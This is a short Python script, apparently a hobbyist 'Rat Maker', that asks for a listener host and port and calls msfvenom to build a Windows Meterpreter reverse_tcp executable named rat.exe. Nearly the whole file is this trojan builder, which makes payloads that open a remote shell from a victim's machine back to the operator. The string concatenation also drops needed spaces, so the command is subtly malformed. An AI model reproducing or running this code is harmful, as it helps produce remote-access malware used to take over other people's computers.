import os
print("""

______      _    ___  ___      _             
| ___ \    | |   |  \/  |     | |            
| |_/ /__ _| |_  | .  . | __ _| | _____ _ __ 
|    // _` | __| | |\/| |/ _` | |/ / _ \ '__|
| |\ \ (_| | |_  | |  | | (_| |   <  __/ |   
\_| \_\__,_|\__| \_|  |_/\__,_|_|\_\___|_|   
                                             
                              Coded by Athena          

""")
d = input('Localhost:')
c = input('Localport:')
os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST='+d+'LPORT='+c+'-f exe > /home/user/Desktop/rat.exe')
print('\033[31m Basarılı ! \033[0m')
